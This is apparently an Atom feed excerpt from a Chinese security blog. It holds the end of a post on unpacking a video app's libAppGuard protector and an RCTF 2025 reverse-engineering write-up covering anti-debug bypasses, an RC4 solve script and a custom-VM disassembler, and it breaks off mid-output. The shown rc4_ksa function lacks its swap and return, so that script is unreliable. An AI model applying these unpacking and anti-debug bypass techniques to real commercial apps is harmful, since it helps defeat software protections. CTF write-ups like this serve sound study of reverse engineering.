class="keyword">break</span></span><br><span class="line">    w7 = (w7 + w6) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">patched = <span class="built_in">bytearray</span>(path)</span><br><span class="line">patched[src_off:src_off + <span class="built_in">len</span>(dst)] = dst</span><br><span class="line">Path(<span class="string">&quot;libAppGuard_unpacked.so&quot;</span>).write_bytes(patched)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>, w7, <span class="string">&quot;bytes&quot;</span>)</span><br></pre></td></tr></table></figure><p>暂时告一段落了</p><p>Frida持久化也不太好搞…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android实战-逆向某li某li视频APP&quot;&gt;&lt;a href=&quot;#Android实战-逆向某li某li视频APP&quot; class=&quot;headerlink&quot; title=&quot;Android实战-逆向某li某li视频APP&quot;&gt;&lt;/a&gt;Android实战-逆向某li某l</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>RCTF 2025 RE wp</title>
    <link href="http://matriy330.github.io/c2e2e113/"/>
    <id>http://matriy330.github.io/c2e2e113/</id>
    <published>2025-11-19T02:36:35.000Z</published>
    <updated>2025-11-19T02:38:42.613Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCTF-2025-RE-wp"><a href="#RCTF-2025-RE-wp" class="headerlink" title="RCTF 2025 RE wp"></a>RCTF 2025 RE wp</h1><h2 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511162048335.png" alt="image-20251116204834285"></p><p>RCTF{AntiDbg_KeyM0d_2025_R3v3rs3}</p><h2 id="chaos2"><a href="#chaos2" class="headerlink" title="chaos2"></a>chaos2</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511162111375.png" alt="image-20251116211153306"></p><p>有花指令</p><p>全patch了</p><p>patch要注意下</p><p>如main中</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511191033101.png" alt="image-20251119103350773"></p><p>不仅红框部分需要nop，绿框也需要</p><p>再修改下函数边界即可(不会的话可以问我)，然后UCP即可</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511191035039.png" alt="image-20251119103534684"></p><p>恢复逻辑，是个rc4</p><p>main调用 EnumUILanguagesA 触发所有反调试回调，随后通过 rc4_init &#x2F; rc4_apply 对 128 字节密文表解密并输出 flag。</p><p>0x401440在模块中搜索标记 0x12345678，找到后记录其后 0x80 字节的地址（0x402818），这里存放 RC4 key，初始为 flag:{Th1sflaglsG00ds}。</p><p>每个反调试函数都在未检测到调试器时把 key 的一个字节修正成正确值，使其最终变成 flag:{ThisflagIsGoods}：</p><ul><li><p>check_PEB_BeingDebugged (0x401090) 把 key[8] 从 ‘1’ 改成 ‘i’。</p></li><li><p>check_ProcessDebugPort (0x401200) 调 NtQueryInformationProcess class 7，返回 0 时把 key[14] 改成 ‘I’。</p></li><li><p>exception_key_patch (0x4012a0) 使用 NtClose 触发异常并在 SEH 中把 key[17] 写成 ‘o’。</p></li><li><p>check_ProcessDebugFlags (0x4013a0) 查询 class 31，返回 1 时写 ‘o’ 到 key[18]。</p><ul><li>这四处patch成功后，rc4_init以 128 字节 key 做标准 RC4 KSA，rc4_apply对密文异或得到RCTF{AntiDbg_Reversing_2025_v2.0_Ch4llenge}。</li></ul></li></ul><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_ksa</span>(<span class="params">key_bytes</span>):</span><br><span class="line">  s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">  j = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">      j = (j + s[i] + key_bytes[i % <span class="built_in">len</span>(key_bytes)]) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_prga</span>(<span class="params">state, data</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">  i = j = <span class="number">0</span></span><br><span class="line">  out = <span class="built_in">bytearray</span>()</span><br><span class="line">  <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">      i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">      j = (j + state[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">      state[i], state[j] = state[j], state[i]</span><br><span class="line">      k = state[(state[i] + state[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line">      out.append(byte ^ k)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">bytes</span>([</span><br><span class="line">  <span class="number">15</span>, <span class="number">26</span>, <span class="number">138</span>, <span class="number">90</span>, <span class="number">34</span>, <span class="number">171</span>, <span class="number">30</span>, <span class="number">99</span>, <span class="number">25</span>, <span class="number">90</span>, <span class="number">135</span>, <span class="number">242</span>, <span class="number">230</span>, <span class="number">233</span>, <span class="number">215</span>, <span class="number">209</span>,</span><br><span class="line">  <span class="number">151</span>, <span class="number">249</span>, <span class="number">248</span>, <span class="number">50</span>, <span class="number">91</span>, <span class="number">222</span>, <span class="number">45</span>, <span class="number">214</span>, <span class="number">163</span>, <span class="number">79</span>, <span class="number">126</span>, <span class="number">203</span>, <span class="number">97</span>, <span class="number">178</span>, <span class="number">63</span>, <span class="number">191</span>,</span><br><span class="line">  <span class="number">183</span>, <span class="number">27</span>, <span class="number">10</span>, <span class="number">132</span>, <span class="number">179</span>, <span class="number">180</span>, <span class="number">222</span>, <span class="number">3</span>, <span class="number">70</span>, <span class="number">123</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">196</span>, <span class="number">179</span>, <span class="number">171</span>, <span class="number">123</span>,</span><br><span class="line">  <span class="number">41</span>, <span class="number">188</span>, <span class="number">31</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">121</span>, <span class="number">38</span>, <span class="number">218</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">102</span>, <span class="number">125</span>, <span class="number">187</span>, <span class="number">238</span>, <span class="number">15</span>,</span><br><span class="line">  <span class="number">137</span>, <span class="number">89</span>, <span class="number">212</span>, <span class="number">95</span>, <span class="number">172</span>, <span class="number">24</span>, <span class="number">174</span>, <span class="number">11</span>, <span class="number">78</span>, <span class="number">240</span>, <span class="number">183</span>, <span class="number">5</span>, <span class="number">92</span>, <span class="number">129</span>, <span class="number">4</span>, <span class="number">159</span>,</span><br><span class="line">  <span class="number">164</span>, <span class="number">28</span>, <span class="number">93</span>, <span class="number">160</span>, <span class="number">185</span>, <span class="number">7</span>, <span class="number">146</span>, <span class="number">92</span>, <span class="number">138</span>, <span class="number">83</span>, <span class="number">243</span>, <span class="number">255</span>, <span class="number">247</span>, <span class="number">167</span>, <span class="number">221</span>, <span class="number">46</span>,</span><br><span class="line">  <span class="number">230</span>, <span class="number">237</span>, <span class="number">15</span>, <span class="number">119</span>, <span class="number">44</span>, <span class="number">74</span>, <span class="number">34</span>, <span class="number">241</span>, <span class="number">54</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">238</span>, <span class="number">13</span>, <span class="number">214</span>, <span class="number">4</span>, <span class="number">115</span>,</span><br><span class="line">  <span class="number">85</span>, <span class="number">94</span>, <span class="number">62</span>, <span class="number">147</span>, <span class="number">164</span>, <span class="number">52</span>, <span class="number">41</span>, <span class="number">103</span>, <span class="number">252</span>, <span class="number">35</span>, <span class="number">121</span>, <span class="number">25</span>, <span class="number">216</span>, <span class="number">201</span>, <span class="number">43</span>, <span class="number">207</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytearray</span>(<span class="string">b&quot;flag:&#123;Th1sflaglsG00ds&#125;&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (<span class="number">128</span> - <span class="number">22</span>))</span><br><span class="line">key[<span class="number">8</span>] = <span class="built_in">ord</span>(<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">key[<span class="number">14</span>] = <span class="built_in">ord</span>(<span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">key[<span class="number">17</span>] = key[<span class="number">18</span>] = <span class="built_in">ord</span>(<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line"></span><br><span class="line">state = rc4_ksa(<span class="built_in">bytes</span>(key))</span><br><span class="line">flag = rc4_prga(state, cipher).rstrip(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h2 id="Onion-赛后"><a href="#Onion-赛后" class="headerlink" title="Onion [赛后]"></a>Onion [赛后]</h2><p>赛后做了下 其实不是难题，赛中主要去参加了R3con，回来实在不想做了(因为没仔细看以为每层的加密算法不一样 😂)</p><p>sub_171D0中包含了如何解释opcode</p><p>像洋葱一样剥就行 有几个方法</p><ol><li>叠工作量，每个去逆</li><li>写自动脚本，因为有具体的模式，不是每层不一样的算法</li></ol><p>sub_171D0 载入 full_vmcode，在 0x10000 字节缓冲区里跑一个自制 VM，并把用户输入的 50 个 64 位 key写到 VM 内存 0xE000 开始的位置。</p><p>0x0000 - 0xDFFF : VM 字节码 </p><p>0xE000 - 0xE18F (400 字节): 50 个 64 位用户输入密钥</p><p>0xE190 - 0xFFFF : 栈空间</p><p>这个是opcode功能的识别</p><table><thead><tr><th>opcode</th><th>语义（64-bit 寄存器 r0~r7，16-bit pointer1&#x2F;pointer2，栈指针 stack_ptr）</th></tr></thead><tbody><tr><td>0x00</td><td>NOP</td></tr><tr><td>0x01 target</td><td>无条件跳转：pc &#x3D; target</td></tr><tr><td>0x02 target</td><td>flag&#x3D;&#x3D;0 时跳转（“if not equal”）</td></tr><tr><td>0x03 target</td><td>flag!&#x3D;0 时跳转（“if equal”）</td></tr><tr><td>0x11 addr</td><td>ptr1 &#x3D; addr（16-bit）</td></tr><tr><td>0x12 addr</td><td>ptr2 &#x3D; addr</td></tr><tr><td>0x15 r</td><td>r &#x3D; qword[ptr1]；flag &#x3D; (r&#x3D;&#x3D;0)</td></tr><tr><td>0x16 r, imm</td><td>r &#x3D; imm；flag &#x3D; (r&#x3D;&#x3D;0)</td></tr><tr><td>0x17 dst, src</td><td>dst &#x3D; src；flag &#x3D; (dst&#x3D;&#x3D;0)</td></tr><tr><td>0x18 r, +off</td><td>r &#x3D; qword[(ptr1 + off) mod 0x10000]；flag &#x3D; (r&#x3D;&#x3D;0)</td></tr><tr><td>0x19 r</td><td>qword[ptr1] &#x3D; r</td></tr><tr><td>0x1A dst, offReg</td><td>取 byte：dst &#x3D; byte[(ptr1 + (offReg &amp; 0xFFFF))]；flag &#x3D; (dst&#x3D;&#x3D;0)</td></tr><tr><td>0x1B dst, offReg</td><td>写 byte：byte[(ptr1 + (offReg &amp; 0xFFFF))] &#x3D; dst &amp; 0xFF</td></tr><tr><td>0x1C r</td><td>r &#x3D; (r + 1) &amp; MASK64；flag &#x3D; (r&#x3D;&#x3D;0)</td></tr><tr><td>0x1D r</td><td>r &#x3D; (r - 1) &amp; MASK64；flag &#x3D; (r&#x3D;&#x3D;0)</td></tr><tr><td>0x1E r, sh</td><td>r &gt;&gt;&#x3D; sh；flag &#x3D; (r&#x3D;&#x3D;0)</td></tr><tr><td>0x1F r</td><td>ptr1 &#x3D; (ptr1 + (r &amp; 0xFFFF)) &amp; 0xFFFF</td></tr><tr><td>0x25 dst, src</td><td>dst &amp;&#x3D; src；flag &#x3D; (dst&#x3D;&#x3D;0)</td></tr><tr><td>0x26 dst, src</td><td>dst ^&#x3D; src；flag &#x3D; (dst&#x3D;&#x3D;src)?</td></tr><tr><td>0x27 r, sh</td><td>r &lt;&lt;&#x3D; sh；flag &#x3D; (r&#x3D;&#x3D;0)</td></tr><tr><td>0x29 r, imm</td><td>tmp&#x3D;r; r ^&#x3D; imm; flag &#x3D; (tmp&#x3D;&#x3D;imm)</td></tr><tr><td>0x2A r, imm</td><td>r &amp;&#x3D; imm；flag &#x3D; (r&#x3D;&#x3D;0)</td></tr><tr><td>0x2B dst, offReg</td><td>取 byte：dst &#x3D; byte[(ptr2 + (offReg &amp; 0xFFFF))]</td></tr><tr><td>0x2C dst, offReg</td><td>写 byte：byte[(ptr2 + (offReg &amp; 0xFFFF))] &#x3D; dst &amp; 0xFF</td></tr><tr><td>0x32 r, imm</td><td>比较：flag &#x3D; (r &#x3D;&#x3D; imm)</td></tr><tr><td>0x80</td><td>“保存 PC”指令，后续 0x81&#x2F;0x82 用</td></tr><tr><td>0x81 idx</td><td>call_table[idx] &#x3D; saved_pc + 3</td></tr><tr><td>0x82 idx</td><td>调用：把返回地址压栈，pc &#x3D; call_table[idx]</td></tr><tr><td>0x83</td><td>RET：从栈弹回</td></tr><tr><td>0x84 r</td><td>把 r 压到 VM 栈（stack_ptr -&#x3D; 8）</td></tr><tr><td>0x85 r</td><td>从 VM 栈弹出到 r</td></tr><tr><td>0x90 byte</td><td>输出字符（打印 flag 时用）</td></tr><tr><td>0xFF</td><td>HALT（结束，返回某个寄存器值）</td></tr></tbody></table><p>写个小脚本翻译一下第一层的opcode成asm</p><pre><code>1. 读取full_vmcode，加载到一块 0x10000 字节的缓冲区。2. 提示 “Enter 50 64-bit keys”，将用户输入的 50 个 64-bit 数写入虚拟机内存，实现方式是把每个 key 存到 0xE000 + i * 8。3. 初始化虚拟机（8 个 64-bit 寄存器、两个 16-bit data pointer、栈/调用表、条件标志等），然后以full_vmcode为指令区执行解释器。</code></pre><p>基于这些理解，让ai大致写了一个翻译脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">OPCODES = &#123;</span><br><span class="line">    <span class="number">0x00</span>: (<span class="string">&quot;nop&quot;</span>, []),</span><br><span class="line">    <span class="number">0x01</span>: (<span class="string">&quot;jmp&quot;</span>, [<span class="string">&quot;addr16&quot;</span>]),</span><br><span class="line">    <span class="number">0x02</span>: (<span class="string">&quot;jne&quot;</span>, [<span class="string">&quot;addr16&quot;</span>]),</span><br><span class="line">    <span class="number">0x03</span>: (<span class="string">&quot;je&quot;</span>, [<span class="string">&quot;addr16&quot;</span>]),</span><br><span class="line">    <span class="number">0x11</span>: (<span class="string">&quot;setp1&quot;</span>, [<span class="string">&quot;imm16&quot;</span>]),</span><br><span class="line">    <span class="number">0x12</span>: (<span class="string">&quot;setp2&quot;</span>, [<span class="string">&quot;imm16&quot;</span>]),</span><br><span class="line">    <span class="number">0x15</span>: (<span class="string">&quot;loadp1&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x16</span>: (<span class="string">&quot;mov_imm&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm64&quot;</span>]),</span><br><span class="line">    <span class="number">0x17</span>: (<span class="string">&quot;mov&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x18</span>: (<span class="string">&quot;loadp1_off&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm16&quot;</span>]),</span><br><span class="line">    <span class="number">0x19</span>: (<span class="string">&quot;storep1&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x1A</span>: (<span class="string">&quot;loadp1_idx8&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x1B</span>: (<span class="string">&quot;storep1_idx8&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x1C</span>: (<span class="string">&quot;inc&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x1D</span>: (<span class="string">&quot;dec&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x1E</span>: (<span class="string">&quot;shr&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm8&quot;</span>]),</span><br><span class="line">    <span class="number">0x1F</span>: (<span class="string">&quot;addp1_reg&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x25</span>: (<span class="string">&quot;and&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x26</span>: (<span class="string">&quot;xor&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x27</span>: (<span class="string">&quot;shl&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm8&quot;</span>]),</span><br><span class="line">    <span class="number">0x29</span>: (<span class="string">&quot;xor_imm&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm64&quot;</span>]),</span><br><span class="line">    <span class="number">0x2A</span>: (<span class="string">&quot;and_imm&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm64&quot;</span>]),</span><br><span class="line">    <span class="number">0x2B</span>: (<span class="string">&quot;loadp2_idx8&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x2C</span>: (<span class="string">&quot;storep2_idx8&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x32</span>: (<span class="string">&quot;cmp_imm&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm64&quot;</span>]),</span><br><span class="line">    <span class="number">0x80</span>: (<span class="string">&quot;save_pc&quot;</span>, []),</span><br><span class="line">    <span class="number">0x81</span>: (<span class="string">&quot;store_call&quot;</span>, [<span class="string">&quot;imm8&quot;</span>]),</span><br><span class="line">    <span class="number">0x82</span>: (<span class="string">&quot;call&quot;</span>, [<span class="string">&quot;imm8&quot;</span>]),</span><br><span class="line">    <span class="number">0x83</span>: (<span class="string">&quot;ret&quot;</span>, []),</span><br><span class="line">    <span class="number">0x84</span>: (<span class="string">&quot;push&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x85</span>: (<span class="string">&quot;pop&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x90</span>: (<span class="string">&quot;print_byte&quot;</span>, [<span class="string">&quot;imm8&quot;</span>]),</span><br><span class="line">    <span class="number">0xFF</span>: (<span class="string">&quot;halt&quot;</span>, []),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">REGS = &#123;i: <span class="string">f&quot;r<span class="subst">&#123;i&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_u16</span>(<span class="params">buf: <span class="built_in">bytes</span>, off: <span class="built_in">int</span></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(buf[off:off+<span class="number">2</span>], <span class="string">&quot;little&quot;</span>), off + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_u64</span>(<span class="params">buf: <span class="built_in">bytes</span>, off: <span class="built_in">int</span></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(buf[off:off+<span class="number">8</span>], <span class="string">&quot;little&quot;</span>), off + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disasm</span>(<span class="params">buf: <span class="built_in">bytes</span>, start: <span class="built_in">int</span>, end: <span class="built_in">int</span> | <span class="literal">None</span> = <span class="literal">None</span></span>):</span><br><span class="line">    pc = start</span><br><span class="line">    limit = <span class="built_in">len</span>(buf) <span class="keyword">if</span> end <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">min</span>(<span class="built_in">len</span>(buf), end)</span><br><span class="line">    <span class="keyword">while</span> pc &lt; limit:</span><br><span class="line">        opcode = buf[pc]</span><br><span class="line">        mnemonic, operands = OPCODES.get(opcode, (<span class="literal">None</span>, <span class="literal">None</span>))</span><br><span class="line">        cur = pc + <span class="number">1</span></span><br><span class="line">        parts: <span class="built_in">list</span>[<span class="built_in">str</span>]</span><br><span class="line">        <span class="keyword">if</span> mnemonic <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># unknown opcode, bail</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc:04x&#125;</span>: .byte 0x<span class="subst">&#123;opcode:02x&#125;</span>&quot;</span>)</span><br><span class="line">            pc += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        values: <span class="built_in">list</span>[<span class="built_in">str</span>] = []</span><br><span class="line">        <span class="keyword">for</span> operand <span class="keyword">in</span> operands:</span><br><span class="line">            <span class="keyword">if</span> operand == <span class="string">&quot;addr16&quot;</span> <span class="keyword">or</span> operand == <span class="string">&quot;imm16&quot;</span>:</span><br><span class="line">                val, cur = read_u16(buf, cur)</span><br><span class="line">                values.append(<span class="string">f&quot;0x<span class="subst">&#123;val:04x&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> operand == <span class="string">&quot;imm8&quot;</span>:</span><br><span class="line">                val = buf[cur]</span><br><span class="line">                cur += <span class="number">1</span></span><br><span class="line">                values.append(<span class="string">f&quot;0x<span class="subst">&#123;val:02x&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> operand == <span class="string">&quot;imm64&quot;</span>:</span><br><span class="line">                val, cur = read_u64(buf, cur)</span><br><span class="line">                values.append(<span class="string">f&quot;0x<span class="subst">&#123;val:016x&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> operand == <span class="string">&quot;reg&quot;</span>:</span><br><span class="line">                val = buf[cur]</span><br><span class="line">                cur += <span class="number">1</span></span><br><span class="line">                values.append(REGS.get(val, <span class="string">f&quot;r<span class="subst">&#123;val&#125;</span>&quot;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;unknown operand kind <span class="subst">&#123;operand&#125;</span>&quot;</span>)</span><br><span class="line">        ops = <span class="string">&quot;, &quot;</span>.join(values)</span><br><span class="line">        spacing = <span class="string">&quot; &quot;</span> <span class="keyword">if</span> ops <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc:04x&#125;</span>: <span class="subst">&#123;mnemonic&#125;</span><span class="subst">&#123;spacing&#125;</span><span class="subst">&#123;ops&#125;</span>&quot;</span>)</span><br><span class="line">        pc = cur</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Disassemble VM bytecode range&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;start&quot;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x, <span class="number">0</span>))</span><br><span class="line">    parser.add_argument(<span class="string">&quot;end&quot;</span>, nargs=<span class="string">&quot;?&quot;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x, <span class="number">0</span>))</span><br><span class="line">    parser.add_argument(<span class="string">&quot;file&quot;</span>, nargs=<span class="string">&quot;?&quot;</span>, default=<span class="string">&quot;full_vmcode&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    buf = Path(args.file).read_bytes()</span><br><span class="line">    disasm(buf, args.start, args.end)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 disasm_vm.py 0x5a9 0x6f4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 